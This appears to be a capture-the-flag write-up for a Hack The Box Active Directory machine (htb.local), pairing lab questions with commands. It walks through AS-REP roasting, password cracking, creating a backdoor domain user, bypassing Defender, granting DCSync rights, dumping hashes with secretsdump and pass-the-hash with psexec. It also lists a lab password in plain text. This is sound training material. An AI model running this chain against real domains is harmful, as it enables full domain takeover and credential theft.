## Table of Contents

    - [MEthodology](#MEthodology)
    - [Foothold](#Foothold)
    - [Prive esc](#Prive\esc)

localip = 10.10.16.13
ip = 10.10.10.161
**Which domain is this machine a DC?**
htb.local
**Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM**
LDAP

**Which user has Kerberos Pre-Authentication disabled?**



User:bf7a8463fc9f3a02856bb17539265ae4


The user svc-alfresco is a member of a group that allows them to add themself to the "Exchange Windows Permissions" group. Which group is that?
Account Operators


### MEthodology

Enumeration ->
`ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.10.161`



check LDAP service for anon login 
`ldapsearch -h MACHINE_IP -p 389 -x -b "dc=htb,dc=local"`


The windapsearch tool can be used to query the domain further. The -U flag is used to enumerate all users, i.e. objects with objectCategory set to user . We find some username and mailbox accounts, which means that exchange is installed in the domain. Let's enumerate all other objects in the domain using the objectClass=* filter.

python winadpsearch.py -d hb.local --dc-ip 10.10.10.161 -U
The -U flag is used to enumerate all users, i.e. objects with objectCategory set to user . We find some username and mailbox accounts, which means that exchange is installed in the domain. Let's enumerate all other objects in the domain using the objectClass=* filter.

python winadpsearch.py -d hb.local --dc-ip 10.10.10.161 --custom "objectClass=\*"

### Foothold
GetNPUsers.py script from impacket can be used to request a TGT ticket and dump the hash
`GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass`





copy hash to a file
`john hash.txt --fork=4 -w=/path/to/wordlist.txt`

### Prive esc

bloodhound-python 
-d htb.local -usvc-alfresco -p s3rvice

**Add a new users jon and add him to Exchange Windows Permissions and Remote management users so that he can change permissions and perform DCSync attack**
```
net user john abc123! /add /domain

net group "Exchange Windows Permisssions" john /add

net localgroup "Remote Management Users" john /add


```

Download PowerView and import >

```
Bypass-4MSI **bypass defender
```

```
add Add-ObjectACL with john credentials to give him DCSynce rights
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```
**Run secretsdump.py to dump the system hashes then login with a PTH using psexec.py with admin acc/hash**
`secretsdump.py htb/john@10.10.10.161`

>
>`psexec.py administrator@10.10.10.161 -hashes <paste hash here>`


